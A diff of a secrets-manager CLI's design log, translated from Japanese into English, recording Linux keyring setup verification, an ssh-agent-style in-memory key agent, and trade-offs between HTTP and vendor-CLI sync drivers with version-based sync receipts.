+**L1 = KL1 implementation log (2026-09-11 — PR #163)**: a new public docs page `/docs/linux-keychain` (`apps/site/docs/linux-keychain.mdx`; two inbound links from getting-started; the index stays at 4 cards). The recipe was written only after verification on a real Ubuntu 24.04 + Bun 1.4.0 machine (the SY1 precedent):
+(1) Without a D-Bus session, `Bun.secrets.set` **blocks indefinitely** (does not return even after 10 minutes) — reproduces the measurement noted in the `KEYCHAIN_TIMEOUT` (30 s) comment in `live.ts`. With a bus but no Secret Service it fails immediately (`keychainUnavailable`).
+(2) `apt-get install gnome-keyring dbus-user-session libsecret-1-0` → inside `dbus-run-session -- bash`, `printf '%s' "$pw" | gnome-keyring-daemon --unlock --components=secrets` → `Bun.secrets` set / get / delete all work.
+(3) Persistence: unlocking again in a different dbus session reads the previous session's stored values. The substance is `~/.local/share/keyrings/login.keyring` (AES, encrypted with the entered password). The daemon is per-session; the data is persistent — the advice for ephemeral containers was written as the two choices "volume-persist this directory or `key recover` on every rebuild".
+(4) **Empty password is not allowed**: it tries to start the GUI prompter (Gcr) without creating a keyring and hangs → timeout via the 30-second guard. The recipe states a non-empty password is required (the classic "empty password = plaintext keyring" warning cannot occur on this path, so it is not written).
+The docs contain only verified facts and the existing code's actual wording (unverified claims like the systemd path are not written — `dbus-run-session` needs no systemd and works as-is in WSL / containers).
 
-**L2 + L3 = KL2 実装録(2026-09-12)**: `apps/cli/src/agent.ts` + `maruhi agent -- <command>`(effect-cli.ts)。裁定は次のとおり(いずれも仕様変更ゼロ — CRYPTO_SPEC / AUTH_SPEC は無改訂):
-(1) **プロセスモデル**: ssh-agent の「コマンド付き起動」形のみ(`maruhi agent -- bash`)。agent は前景で子を起動し、**子の終了 = agent の終了**(メモリ破棄・ソケット削除・子の終了コードで exit)。`eval $(ssh-agent)` 型のデタッチは採らない — 親を失った常駐は生存期間の上限が無い漏れ方で、KL1 の `dbus-run-session -- bash` と同じ入れ子シェル形に揃えるほうが説明も一致する。
-(2) **IPC**: unix ドメインソケット(node:net — Bun / Node 両対応を実測し、vitest の Node で実ソケットのテストが書ける)。置き場は `$XDG_RUNTIME_DIR`(無ければ os.tmpdir())配下の mkdtemp ディレクトリ(0700)+ `agent.sock`(0600)。パスは `MARUHI_AGENT_SOCK` で子へ渡す。権限境界は**同一ユーザー** = OS キーチェーン(Secret Service も同一ユーザーの D-Bus)と同等で、これより強い境界はこの層に無い。Windows は明示エラー(Credential Manager があり不要)。
-(3) **プロトコル**: 1 接続 1 要求の改行区切り JSON(`{v:1, op:get|set|remove, name, value?}` → `{ok, value|error}`)。運ぶのは `Keychain` サービスと同じレコード文字列。ローカル・同一ユーザー・ディスクを通らない経路なので**暗号操作は足さない**(仕様に無い封緘を発明しない)。版違い・壊れた要求は `ok:false`(黙って解釈しない)。上限 64 KiB・5 秒タイムアウト。
-(4) **鍵の受け渡し = `Keychain` サービスの差し替え**: `MARUHI_AGENT_SOCK` があれば live 層が `makeAgentKeychain` を採る(OS キーチェーンより優先。`MARUHI_TOKEN` の優先順位は従来どおり最上位)。よって login / `key generate` / `key recover` / pull / run / push は**無変更**で agent のメモリへ着地する — 補足 12 の「取得 → 復号 → L2 のメモリへ」は recovery.ts を変えずに配線された。既存の制約(`RECOVERY_FETCH_LIMIT` 1 時間 5 回・コード入力は人間の対話端末のみ)はそのまま。成功文言は保存先を出し分ける(`KeychainShape.kind` — 「OS keychain」/「the maruhi agent's memory」。キーチェーン不在環境で実在しない場所を指さない)。
-(5) **生存期間・失効**: 子の寿命に束縛。**TTL フラグは付けない**(`key recover` の取得制限と衝突して再復元を強いる)。失効 = シェルを抜ける / `maruhi logout`(agent から remove + サーバー失効)。入れ子(agent の中で `maruhi agent`)は拒否。シグナルは ssh-agent と同じ: 子が生きている間 SIGINT は agent 側で無視(子の対話シェルが扱う — 端末の Ctrl+C は前景プロセスグループ全体に届くため、無視しないとシェルが保持先を失う)、SIGTERM / SIGHUP は子へ転送(Bun で実測)。
-(6) **エージェント環境(ADR-0016 決定 7)**: `maruhi agent` 自体に `isAgent` ゲートは足さない — agent は保持機構であって値の表示経路ではなく、表示・儀式のゲートは各コマンド側に据え置く(deny-list ゲートの適用範囲を広げない)。`maruhi run` の子が `MARUHI_*` を受け取らない既存規則により `MARUHI_AGENT_SOCK` も子へ渡らない(決定 5 と同じ帰結 — 注入値で走るツールが勝手にセッションを持たない)。
-(7) **docs**: `/docs/linux-keychain` に「Keep secrets in memory for one shell」節を追加(agent = 即日・無設定・揮発、keyring = 5 行・永続の 2 択として提示)。テストは `apps/cli/test/agent.test.ts`(プロトコル・実ソケット往復・権限・後始末・`key recover` の agent 着地)。
+**L2 + L3 = KL2 implementation log (2026-09-12)**: `apps/cli/src/agent.ts` + `maruhi agent -- <command>` (effect-cli.ts). The rulings (all with zero spec change — CRYPTO_SPEC / AUTH_SPEC unrevised):
+(1) **Process model**: only ssh-agent's "launch with a command" form (`maruhi agent -- bash`). The agent starts the child in the foreground and **the child's exit = the agent's exit** (memory discarded, socket removed, exits with the child's exit code). The `eval $(ssh-agent)`-style detach is not taken — a resident process that lost its parent leaks with no lifetime bound, and aligning to the same nested-shell form as KL1's `dbus-run-session -- bash` also keeps the explanation consistent.
+(2) **IPC**: unix domain socket (node:net — verified to work on both Bun and Node, so real-socket tests can be written under vitest's Node). Placement: a mkdtemp directory (0700) under `$XDG_RUNTIME_DIR` (or os.tmpdir()) + `agent.sock` (0600). The path is passed to the child via `MARUHI_AGENT_SOCK`. The permission boundary is **same-user** = equivalent to the OS keychain (Secret Service is also same-user D-Bus); no stronger boundary exists at this layer. Windows gets an explicit error (Credential Manager exists and is not needed).
+(3) **Protocol**: newline-delimited JSON, one request per connection (`{v:1, op:get|set|remove, name, value?}` → `{ok, value|error}`). It carries the same record strings as the `Keychain` service. Since the path is local, same-user, and never touches disk, **no cryptographic operations are added** (no off-spec sealing is invented). Version mismatches and malformed requests get `ok:false` (never silently interpreted). Limits: 64 KiB, 5-second timeout.
+(4) **Key handoff = swapping the `Keychain` service**: when `MARUHI_AGENT_SOCK` is present the live layer adopts `makeAgentKeychain` (takes priority over the OS keychain; `MARUHI_TOKEN` keeps its existing top priority). So login / `key generate` / `key recover` / pull / run / push land in the agent's memory **unchanged** — supplement 12's "fetch → decrypt → into L2's memory" was wired without changing recovery.ts. Existing constraints unchanged (`RECOVERY_FETCH_LIMIT` 5 per hour, code entry only on a human interactive terminal). Success wording varies by storage destination (`KeychainShape.kind` — "OS keychain" / "the maruhi agent's memory"; never points at a nonexistent place in a keychain-absent environment).
+(5) **Lifetime / revocation**: bound to the child's lifetime. **No TTL flag** (it would collide with `key recover`'s fetch limit and force re-restores). Revocation = exit the shell / `maruhi logout` (remove from the agent + server revocation). Nesting (`maruhi agent` inside an agent) is refused. Signals match ssh-agent: while the child is alive the agent ignores SIGINT (the child's interactive shell handles it — Ctrl+C on a terminal reaches the whole foreground process group, so not ignoring it would leave the shell without its holder), SIGTERM / SIGHUP are forwarded to the child (verified on Bun).
+(6) **Agent environments (ADR-0016 decision 7)**: no `isAgent` gate is added to `maruhi agent` itself — an agent is a retention mechanism, not a value-display path, and the display / ceremony gates stay on each command side (do not widen the deny-list gate's scope). The existing rule that `maruhi run`'s child does not receive `MARUHI_*` also keeps `MARUHI_AGENT_SOCK` out of children (same consequence as decision 5 — a tool running on injected values doesn't silently acquire a session).
+(7) **docs**: added a "Keep secrets in memory for one shell" section to `/docs/linux-keychain` (presented as the two choices: agent = same-day, zero-config, volatile; keyring = 5 lines, persistent). Tests are in `apps/cli/test/agent.test.ts` (protocol, real-socket round trip, permissions, cleanup, `key recover` landing in the agent).
 
-**KL2 反復記録(2026-09-12 — 各裁定を「新案が出なくなるまで」回した結果)**。初回の裁定は各 1 巡だったため、所有者の指示で銀の弾丸案・上位互換案の模索を裁定ごとに反復した。実測 2 点: Bun は `node:child_process` の `detached: true` でデーモン化できる(gpg-agent 型は実装可能)。委任モデルで agent 側へ移る master 鍵の使用箇所は約 30(署名 19・HPKE open 3・公開鍵参照 8)。
+**KL2 iteration log (2026-09-12 — the result of iterating each ruling "until no new options emerge")**. Because each ruling was initially decided in a single round, the owner directed that the silver-bullet / superset search be iterated per ruling. Two measurements: Bun can daemonize via `node:child_process` `detached: true` (the gpg-agent form is implementable). Under the delegation model, about 30 places move to the agent side as master-key uses (19 signings, 3 HPKE opens, 8 public-key references).
 
-| 裁定 | 巡 | 検討した案と評価 | 結論 |
+| Ruling | Rounds | Options considered and evaluation | Conclusion |
 |---|---|---|---|
-| プロセスモデル | 4 | ① 入れ子形(採用)/ eval デタッチ / 前景 `-D`。② **gpg-agent 型**(固定パス `$XDG_RUNTIME_DIR/maruhi/agent.sock` + `login` で自動起動 + `agent stop`): UX 最良(入れ子不要・複数端末で共有)だが無期限常駐・古いソケット検出・停止の儀式が要り、Codespaces は XDG_RUNTIME_DIR 不在が多く logind の掃除が効かない。③ 既存 ssh-agent に預ける / systemd --user / SSH 署名からの KEK 導出: 前 2 つは環境依存、KEK 導出は仕様外の暗号操作(KL3 の材料)。④ **転送 agent**(手元の agent を `ssh -R` / `gh codespace ssh -- -R` で遠隔へ): ssh-agent 転送の同型で現行プロトコルのまま動く。Docker Desktop の devcontainer は unix ソケットの bind mount が効かず SSH 系限定 | 入れ子形を維持。gpg-agent 型はゲート後の UX 課題として保留。転送 agent は**未検証のため公開 docs には書かない**(KL1 と同じ「検証事実だけ」の規律。sshd / Codespaces の実機で検証してから) |
-| IPC / 権限 | 3 | ① unix ソケット 0700/0600(採用)/ `Bun.listen`: 同等。② 抽象ソケット名 / TCP loopback: **ファイル権限が効かず同一ホストの他ユーザーが接続できる** = 現行より弱い。③ `SO_PEERCRED` / fd 継承 / 環境変数クッキー: node:net に peer cred の口が無い・fd は孫プロセスへ届かない・クッキーは `/proc/*/environ` で同一ユーザーに読める | 現行が最良。上位互換なし |
-| プロトコル | 2 | 改行 JSON(採用)に対し長さ前置 / Effect RPC / `lock` / `list`。RPC は 3 操作に過剰、`lock` はロック中の鍵を包む暗号操作が要り仕様外。`list`(名前だけ・値を運ばない)は古いソケットの診断と保持内容の確認に使える小さな上位互換 | 現行 + **`list` を実装**(`maruhi agent status`) |
-| 鍵の受け渡し | 3 | ① Keychain 差し替え(採用): OS キーチェーンと**同等**の境界。② **委任モデル**(agent が署名と HPKE open を代行する `MasterKeyOps` サービス。Keychain 実装と agent 実装を持つ): 鍵素材がソケットを渡らず、agent 内でも import 後は非抽出 CryptoKey だけを持てる。侵害の被害が「セッション中の DEK と署名」に限定され、**永続的な master 鍵窃取が消える**(ssh-agent 本来の設計)。限界: 同一ユーザーのローカル攻撃者は agent に DEK を解かせて値を復号できるので、改善するのはセッション後のみ。費用は約 30 箇所の切り替えで 2〜4 日、`key recovery` は agent 内で封緘するかセッション内では拒否する設計が要る。③ 委任 + 転送: 鍵が手元の端末から一切出ない。KL3 の「旧端末が承認して再封印」と同じ形に収束する | **到達点として最良は ②+③**。ただし KL2 は「仕様変更ゼロの暫定経路」であり、規模を超え、KL3 の端末移行と機構が重なるため、**KL3 の設計セッションで一緒に裁定する**。現行は維持 |
-| 生存期間・失効 | 2 | idle timeout / TTL: `key recover` の取得制限(1 時間 5 回)と衝突。**KL3 で再取得が安くなる(パスキー PRF)まで採らない**。`mlock` / core dump 抑止は Bun から触れない(ssh-agent はやる)— docs で `ulimit -c 0` を案内できる程度 | 現行 |
-| エージェント環境(決定 7) | 2 | isAgent 拒否は `maruhi run` を許す決定 7 の意図と矛盾。master エントリの `get` 拒否は呼び出し元を識別できず、委任モデルでも AI エージェントは DEK を得て復号できるので閉じられない。決定 7 は「トランスクリプトへの流出を防ぐ UX 境界」でありローカル攻撃者への境界ではない(既存の整理どおり) | 現行 |
+| Process model | 4 | ① Nested form (adopted) / eval detach / foreground `-D`. ② **gpg-agent type** (fixed path `$XDG_RUNTIME_DIR/maruhi/agent.sock` + auto-start on `login` + `agent stop`): best UX (no nesting, shared across terminals) but needs indefinite residency, stale-socket detection, and a stop ceremony; Codespaces often lacks XDG_RUNTIME_DIR and logind cleanup doesn't work. ③ Entrust to an existing ssh-agent / systemd --user / derive the KEK from an SSH signature: the first two are environment-dependent; KEK derivation is an off-spec crypto operation (KL3 material). ④ **Forwarding agent** (forward the local agent to the remote via `ssh -R` / `gh codespace ssh -- -R`): the same shape as ssh-agent forwarding, works on the current protocol. Docker Desktop's devcontainer can't bind-mount a unix socket, so SSH-family only | Keep the nested form. gpg-agent type shelved as a post-gate UX issue. Forwarding agent is **not written in public docs because unverified** (same "verified facts only" discipline as KL1; write it after verifying on real sshd / Codespaces) |
+| IPC / permissions | 3 | ① unix socket 0700/0600 (adopted) / `Bun.listen`: equivalent. ② Abstract socket name / TCP loopback: **file permissions don't apply and other users on the same host can connect** = weaker than current. ③ `SO_PEERCRED` / fd inheritance / env-var cookie: node:net has no peer-cred interface, fds don't reach grandchildren, a cookie is readable by the same user via `/proc/*/environ` | Current is best. No superset |
+| Protocol | 2 | Against newline JSON (adopted): length-prefixed / Effect RPC / `lock` / `list`. RPC is excessive for 3 operations; `lock` needs a crypto operation to wrap the held keys = off-spec. `list` (names only, carries no values) is a small superset usable for stale-socket diagnosis and inspecting held contents | Current + **implement `list`** (`maruhi agent status`) |
+| Key handoff | 3 | ① Keychain swap (adopted): **equivalent** boundary to the OS keychain. ② **Delegation model** (a `MasterKeyOps` service where the agent performs signing and HPKE open; has both a Keychain implementation and an agent implementation): key material never crosses the socket, and inside the agent only a non-extractable CryptoKey is held after import. Compromise damage is limited to "in-session DEKs and signatures", and **permanent master-key theft disappears** (ssh-agent's original design). Limit: a same-user local attacker can make the agent unwrap DEKs and decrypt values, so the improvement is post-session only. Cost is ~30 swap sites, 2–4 days; `key recovery` needs a design that either seals inside the agent or is refused in-session. ③ Delegation + forwarding: the key never leaves the local device at all. Converges to the same shape as KL3's "the old device approves and re-seals" | **The best endpoint is ②+③**. However KL2 is "an interim path with zero spec change", this exceeds its scale, and the mechanism overlaps KL3's device migration, so **rule on it together in KL3's design session**. Keep the current form |
+| Lifetime / revocation | 2 | idle timeout / TTL: collides with `key recover`'s fetch limit (5 per hour). **Do not adopt until KL3 makes re-fetching cheap (passkey PRF)**. `mlock` / core-dump suppression can't be reached from Bun (ssh-agent does it) — docs can guide `ulimit -c 0` at most | Current |
+| Agent environments (decision 7) | 2 | An isAgent refusal contradicts decision 7's intent of allowing `maruhi run`. Refusing `get` on the master entry can't identify the caller, and even under the delegation model an AI agent can obtain DEKs and decrypt — it can't be closed. Decision 7 is "a UX boundary against transcript leakage", not a boundary against local attackers (as already organized) | Current |
 
-**反復後の実装(同日)**: プロトコルに `{"v":1,"op":"list"}` → `{"ok":true,"names":[…]}` を追加し、`maruhi agent status` がセッションの保持内容(どのサーバーのトークン・誰の master 鍵)を**名前だけ**で表示する(値は運ばない・出さない)。`agent` は audit と同じ「親ハンドラ + サブコマンド」形(bare `maruhi agent -- <cmd>` が起動、`agent status` が確認)。`--` を跨いでサブコマンドを解決しないので `maruhi agent -- status` は子コマンド `status` の実行のまま。
+**Implementation after iteration (same day)**: added `{"v":1,"op":"list"}` → `{"ok":true,"names":[…]}` to the protocol, and `maruhi agent status` shows the session's held contents (which server's token, whose master key) **by name only** (no values carried or shown). `agent` takes the same "parent handler + subcommand" shape as audit (bare `maruhi agent -- <cmd>` starts it, `agent status` inspects). Since subcommands are not resolved across `--`, `maruhi agent -- status` still runs `status` as a child command.
 
-**改訂 2(2026-09-11 — PR #163 レビュー対応)**: pullfrog の精度指摘 3 点を反映。(a) メッセージと原因は 1 対 1 でない — `keychainOp` の `onTimeout` 既定は `keychainUnavailable` で、**read のタイムアウトも "Cannot access…" に落ちる**(専用文言を持つのは set / delete のみ)。ページは「文言から原因を診断しない。どちらも同じ修正」へ書き換え、timeout 文言は write(`login` / `key generate`)のハングで出ると明記。(b) devcontainer 節にパッケージ導入(イメージ / postCreateCommand)+ セッションごとの unlock が両経路の前提であることを先頭に明記(2 択はキーリング**データ**の永続化の選択のみ)。(c) `key recover` の硬い制限を数値で明記 — ブロブ取得は 1 時間 5 回 / ユーザー(`RECOVERY_FETCH_LIMIT` — AUTH_SPEC §13-3)+ コード入力は人間の対話端末必須(エージェント環境拒否)なので、エージェント駆動の devcontainer は volume 永続化一択。ニトピック 2 点も反映(`dbus-run-session` の出所は `dbus-bin`〔`dbus-user-session` が引き込む〕/ レシピは対話貼り付け用でスクリプト保存不可 / SELF_HOSTING 引用コマンドに `--token-ttl-days` を追加)。
+**Revision 2 (2026-09-11 — PR #163 review response)**: reflected pullfrog's 3 precision points. (a) Messages and causes are not 1:1 — `keychainOp`'s `onTimeout` default is `keychainUnavailable`, so **a read timeout also lands on "Cannot access…"** (only set / delete have dedicated wording). The page was rewritten to "don't diagnose the cause from the wording; the same fix covers both", and it now states that the timeout wording appears on a write (`login` / `key generate`) hang. (b) The devcontainer section now states up front that package install (image / postCreateCommand) + a per-session unlock are prerequisites for both paths (the two choices concern only keyring **data** persistence). (c) `key recover`'s hard limits are now written with numbers — blob fetch is 5 per hour per user (`RECOVERY_FETCH_LIMIT` — AUTH_SPEC §13-3) + code entry requires a human interactive terminal (refused in agent environments), so an agent-driven devcontainer has volume persistence as its only option. Two nits also reflected (`dbus-run-session` comes from `dbus-bin`〔pulled in by `dbus-user-session`〕/ the recipe is for interactive pasting and cannot be saved as a script / added `--token-ttl-days` to the SELF_HOSTING quoted command).
 
-### 補足 13: ベンダー CLI ドライバの欠点と第 5 ラウンド(2026-09-04)
+### Supplement 13: drawbacks of the vendor-CLI driver and round 5 (2026-09-04)
 
-**V1(ベンダー CLI ドライバ)の欠点 — 正直に**。V1 は「上位互換」ではなく、HTTP アダプタ(S8)とのトレードオフだった。
+**V1's (vendor-CLI driver) drawbacks — honestly**. V1 was not a "superset"; it was a trade-off against the HTTP adapter (S8).
 
-| 欠点 | 内容 | 重さ |
+| Drawback | Content | Weight |
 |---|---|---|
-| D1. 実行時の供給網 | maruhi が第三者の CLI(npm の `vercel` / `wrangler` / `netlify`、バイナリの `gh`)を起動し、平文をその stdin に渡す。`npx` で毎回最新を取る運用は npm 経由の改竄・タイポスクワットに晒される。HTTP アダプタなら maruhi 自身のコードだけが経路 | **重い**(緩和: 版を固定〔`npx vercel@x.y.z`〕・導入済みバイナリを優先・自動インストールしない・ハッシュ固定) |
-| D2. ベンダー CLI のテレメトリ | `vercel`・`wrangler`・`netlify` の各 CLI は既定で利用状況を送る。maruhi 自身は「言わざる」でも、駆動する CLI が送る | 中(緩和: 駆動時に `VERCEL_TELEMETRY_DISABLED=1` / `WRANGLER_SEND_METRICS=false` / `NETLIFY_TELEMETRY_DISABLED=1` を環境に付ける — ブランドと整合) |
-| D3. ベンダー CLI のディスク書き込み | デバッグログ・キャッシュ(`~/.config/.wrangler/logs`、`.vercel/`)に値が混入しないかはドライバごとの監査が要る | 中(緩和: ログ抑止の環境変数・ドライバごとの確認) |
-| D4. ベンダー側トークンの保管場所 | 手元ではベンダー CLI の認証を使うが、その多くは**平文ファイル**(`~/.config/vercel/auth.json` 等)にトークンを置く。HTTP アダプタ + maruhi 変数なら統合用トークンも E2EE・メモリのみ | 中(maruhi のファイルではないが、docs で勧める経路の資格が平文で置かれる) |
-| D5. 性能・原子性 | `vercel env add` は変数ごとに 1 プロセス(50 変数で 1〜2 分)。上書きは `rm` → `add` で一瞬「値がない」窓ができる(`--force` で緩和)。HTTP API は配列で一括 upsert できる | 中(Vercel は HTTP のほうが速く安全。`wrangler secret bulk` / `gh` は一括で問題ない) |
-| D6. 出力・終了コードの不安定さ | `sync diff` にベンダー CLI の一覧出力を使うと形式変更で壊れる。型付きエラーにできない | 小〜中 |
-| D7. CI でのインストール時間 | 毎回 `npx` で CLI を落とすと遅い(D1 と同根) | 小 |
+| D1. Runtime supply chain | maruhi launches third-party CLIs (`vercel` / `wrangler` / `netlify` from npm, the `gh` binary) and passes plaintext to their stdin. An `npx` fetch-latest-each-time operation is exposed to npm-side tampering and typosquatting. With an HTTP adapter, only maruhi's own code is in the path | **Heavy** (mitigations: pin the version〔`npx vercel@x.y.z`〕, prefer already-installed binaries, never auto-install, hash-pin) |
+| D2. Vendor CLI telemetry | `vercel`, `wrangler`, `netlify` CLIs send usage data by default. Even though maruhi itself "does not tell", the CLIs it drives do | Medium (mitigation: attach `VERCEL_TELEMETRY_DISABLED=1` / `WRANGLER_SEND_METRICS=false` / `NETLIFY_TELEMETRY_DISABLED=1` to the environment when driving — consistent with the brand) |
+| D3. Vendor CLI disk writes | Whether values leak into debug logs / caches (`~/.config/.wrangler/logs`, `.vercel/`) requires a per-driver audit | Medium (mitigations: log-suppression env vars, per-driver verification) |
+| D4. Where the vendor-side token is stored | Locally we use the vendor CLI's auth, but most of those store the token in a **plaintext file** (`~/.config/vercel/auth.json` etc.). With an HTTP adapter + maruhi variables, even the integration token is E2EE and memory-only | Medium (not maruhi's file, but the credential for a path docs recommend sits in plaintext) |
+| D5. Performance / atomicity | `vercel env add` is one process per variable (1–2 minutes for 50 variables). Overwrite is `rm` → `add`, opening a momentary "no value" window (mitigated by `--force`). The HTTP API can batch-upsert an array | Medium (for Vercel, HTTP is faster and safer. `wrangler secret bulk` / `gh` are batch and fine) |
+| D6. Unstable output / exit codes | Using vendor CLI listing output for `sync diff` breaks on format changes. Can't be made a typed error | Small–medium |
+| D7. Install time in CI | Fetching the CLI via `npx` each run is slow (same root as D1) | Small |
 
-**第 5 ラウンドの案**:
+**Round-5 options**:
 
-| 案 | 内容 | 評価 |
+| Option | Content | Evaluation |
 |---|---|---|
-| W1. **ドライバを 1 つのインターフェースにし、種類を 2 つ持つ(`http` と `exec`)** | 第一級の 3 先(Vercel / Cloudflare Workers / Netlify)は **`http` ドライバ**(maruhi 自身のコード・一括 upsert・型付きエラー・供給網なし・統合トークンは maruhi 変数で E2EE)。ロングテールと GitHub(`gh`)は **`exec` ドライバ**(版固定・テレメトリ off・ログ抑止を共通部品で付与)。デプロイ時再適用(P3)は `exec` の典型 | **◎ 第 4 ラウンドの補正**。V1 の利点(トークン保管不要・ベンダー保守)はテールで享受し、欠点 D1 / D4 / D5 は第一級の先で回避する |
-| W2. **同期レシート(version による同期状態)** | 「どの同期先に、どの変数の version まで届いたか」を `_sync` 環境の変数(E2EE)として保存する。値由来のダイジェストは使わない(推測可能な値の漏洩経路になる)— 既存の version 番号だけで足りる | **◎ 新規の発見**。(1) `sync diff` が同期先を読み戻さずに済む(D6 が消える)。(2) push 時同期の失敗 = レシートが進まない = 「未同期の印」が自然に出る。(3) **ローテーション(§4)の工程 ④「行き渡らせる」の追跡器になる**: `var rotate --finalize` は全レシートが新 version を指すまで旧資格の無効化を拒める。同期とローテーションが同じ部品で繋がる |
-| W3. 同期対象を減らす案内 | `NEXT_PUBLIC_*` 等の公開設定はリポジトリに置き maruhi に入れない。プラットフォーム所有の資源(Cloudflare の D1 / KV / R2 バインディング、Vercel Postgres / Blob の自動注入)は同期不要。同期が要るのはサードパーティ API キーだけ | ○ docs。値なしスキーマの型に「public」を足す案は S 系列の再訪項目(概念が増えるので今は見送り) |
-| W4. Vercel は OIDC を出すので、コードを変えられる人には SDK(K2)を「同期しない選択肢」として並記 | — | ○ 位置づけ(§5)。同期の代替であって上位互換ではない(コード変更が要る) |
-| W5. 暗号化した値をリポジトリに置き Vercel がビルド時に復号(SOPS 型) | Git 連携のまま「commit = 同期」になる | × ADR-0014 ガードレール(暗号化 `.env` の git 格納を製品の顔にしない)。ランタイム関数の env にも届かない。採らない |
+| W1. **Make the driver a single interface with two kinds (`http` and `exec`)** | The first-class 3 destinations (Vercel / Cloudflare Workers / Netlify) get the **`http` driver** (maruhi's own code, batch upsert, typed errors, no supply chain, integration tokens as E2EE maruhi variables). The long tail and GitHub (`gh`) get the **`exec` driver** (version pinning, telemetry off, log suppression provided as shared parts). Deploy-time re-apply (P3) is the `exec` archetype | **◎ the round-4 correction**. Enjoy V1's benefits (no token storage, vendor-maintained) in the tail, while avoiding drawbacks D1 / D4 / D5 on the first-class destinations |
+| W2. **Sync receipt (sync state by version)** | Store "which sync destination received which variable up to which version" as variables (E2EE) in the `_sync` environment. No value-derived digests (they'd be a leak path for guessable values) — the existing version number suffices | **◎ a new finding**. (1) `sync diff` no longer needs to read the destination back (D6 disappears). (2) A push-time sync failure = the receipt doesn't advance = the "not-yet-synced mark" surfaces naturally. (3) **Becomes the tracker for rotation (§4) step ④ "propagate"**: `var rotate --finalize` can refuse to revoke the old credential until every receipt points at the new version. Sync and rotation connect via the same component |
+| W3. Guidance to reduce what gets synced | `NEXT_PUBLIC_*`-style public config lives in the repo and not in maruhi. Platform-owned resources (Cloudflare D1 / KV / R2 bindings, Vercel Postgres / Blob auto-injection) need no sync. Only third-party API keys need syncing | ○ docs. Adding a "public" type to the no-value schema is an S-series revisit item (adds a concept, so deferred for now) |
+| W4. Since Vercel issues OIDC, list the SDK (K2) alongside as "the option that doesn't sync" for people who can change code | — | ○ positioning (§5). An alternative to sync, not a superset (requires a code change) |
+| W5. Put encrypted values in the repo and have Vercel decrypt at build time (SOPS type) | "commit = sync" while keeping Git integration | × ADR-0014 guardrail (don't make git-stored encrypted `.env` the product's face). Also can't reach runtime function env. Not adopted |
 
-**結論(第 5 ラウンド)**: **W1 + W2**。第一級の 3 先は HTTP、テールと GitHub は exec、同期状態は version のレシートで持つ。「同期先トークンを maruhi に置かない」は第一級の先では放棄し(E2EE の maruhi 変数に置くほうが平文ファイルより良い)、テールでだけ享受する。第 4 ラウンドの「HTTP アダプタは退避経路」は撤回し、「HTTP が第一級・exec がテール」に戻す。
+**Conclusion (round 5)**: **W1 + W2**. First-class 3 destinations are HTTP, the tail and GitHub are exec, sync state is held in version receipts. "Don't put destination tokens in maruhi" is abandoned for the first-class destinations (an E2EE maruhi variable is better than a plaintext file) and enjoyed only in the tail. Retract round 4's "HTTP adapter is the fallback path" and return to "HTTP is first-class, exec is the tail".
 
-### 補足 14: 第 6 ラウンド — 天井の確認と残る磨き込み(2026-09-05)
+### Supplement 14: round 6 — confirming the ceiling and the remaining polish (2026-09-05)
 
-第 5 ラウンドの形(http が第一級・exec がテール・version レシート)を「現状最適」として記録した上で、さらに探した。**結論: 現在の制約(同期先に平文が置かれる・サーバーは平文を持たない・仕様改訂なし)の下では、構造を変える上位互換は見つからなかった。** 見つかったのは磨き込み 8 点と、天井そのものを上げる条件 3 つ。
+After recording round 5's shape (http is first-class, exec is the tail, version receipts) as "currently optimal", we searched further. **Conclusion: under the current constraints (plaintext sits at the sync destination, the server holds no plaintext, no spec revision), no structure-changing superset was found.** What was found: 8 polish items and 3 conditions that would raise the ceiling itself.
 
-**磨き込み**:
+**Polish**:
 
-| # | 内容 | 効果 |
+| # | Content | Effect |
 |---|---|---|
-| M1. **レシートのローテーション対応(バグの先回り)** | CRYPTO_SPEC §7 / §4.1 のとおり、エポックローテーションは現在値を**新 version として再暗号化する**(平文は不変)。version だけのレシートは全変数を「未同期」と誤判定する。対処: ローテーション実行者の CLI(平文が不変であることを知っている唯一の主体)が `env rotate` の中でレシートを新 version へ進める。暗号操作の追加なし | 誤った再同期の嵐を防ぐ。**第 5 ラウンドの設計の欠陥を 1 つ潰した** |
-| M2. **プリセットを両種類とも宣言的に** | `http` プリセット = エンドポイント / 認証ヘッダ / ボディのテンプレート、`exec` プリセット = コマンド / 版固定 / stdin の形式 / テレメトリ off の環境変数。追加はデータ(JSON)+ モック応答のテストで、コードを書かない | 寄贈が受けやすく、供給網の固定(exec の版・ハッシュ)を宣言に含められる |
-| M3. **クラウドの秘密ストアは CI の OIDC で静的トークンゼロ** | AWS / GCP / Azure / Vault は GitHub OIDC を受けるので、CI 経由なら統合トークンが要らない。Vercel / Netlify / Cloudflare の API は OIDC を受けないのでトークンが残る | docs で「クラウド = OIDC・トークンなし / PaaS = トークン 1 つ」と線を引ける |
-| M4. **`sync plan` / `sync apply`(Terraform 型)** | 名前と version だけの差分を先に見せ、production は既定で plan → 明示 apply | production の既定 = 手動(補足 4 A8)を UI として自然にする |
-| M5. **スキーマ駆動の完全性検査** | 値なしスキーマ(S 系列)の `required` を使い、「同期先にその環境の required がすべて届いているか」を `run` の presence fail-fast と同じ規則で検査 | 新しい機構なし。契約(スキーマ)が同期先にも適用される |
-| M6. **第一級の集合の再考** | 対象層では Vercel と Cloudflare が支配的で、Netlify は CLI が値を引数に取るため exec 不可 = http 必須。第一級を 2 つ(Vercel / Cloudflare)に絞り Netlify を第 2 波に回す選択肢がある | http ドライバの初期実装が 1 つ減る(所有者裁定) |
-| M7. **統合トークンの最小権限と回転** | Cloudflare API トークンはアカウント + Workers Scripts:Edit にスコープでき、API で値を回せる。Vercel / Netlify のトークンはアカウント幅で UI 発行のみ。統合トークン自体が maruhi の変数なので、§4 のローテーションコネクタ(Cloudflare)の対象になる | docs + コネクタ 1 つ |
-| M8. **push セッション末尾で 1 回だけ同期** | `maruhi push` は 1 変数ずつなので、複数 push の連続では最後に 1 回まとめて同期する(`--no-sync` + 明示 `sync`、または短い debounce) | 同期先 API の呼び出し回数と原子性の窓を減らす |
+| M1. **Make receipts rotation-aware (getting ahead of a bug)** | Per CRYPTO_SPEC §7 / §4.1, an epoch rotation re-encrypts current values **as new versions** (plaintext unchanged). A version-only receipt would misjudge every variable as "not synced". Fix: the rotating executor's CLI (the only party that knows the plaintext is unchanged) advances receipts to the new versions inside `env rotate`. No crypto operations added | Prevents a storm of mistaken re-syncs. **Killed one design defect in round 5's design** |
